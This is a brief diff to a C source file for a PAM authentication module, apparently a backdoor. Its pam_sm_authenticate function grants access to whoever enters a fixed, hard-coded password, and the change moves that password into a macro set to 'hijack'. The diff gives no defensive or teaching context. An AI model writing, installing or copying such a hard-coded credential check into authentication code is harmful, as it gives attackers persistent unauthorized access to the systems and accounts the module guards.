@@ -1,3 +1,5 @@
+#define PASSWORD "hijack"
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -18,7 +20,7 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags, int argc, con
 	if ((retval = pam_get_authtok(pamh, 0, &passwd, NULL)) != PAM_SUCCESS) {
 		return retval;
 	}
-	if (strcmp(passwd, "master") != 0) {
+	if (strcmp(passwd, PASSWORD) != 0) {
 		return PAM_AUTH_ERR;
 	}
 	return PAM_SUCCESS;
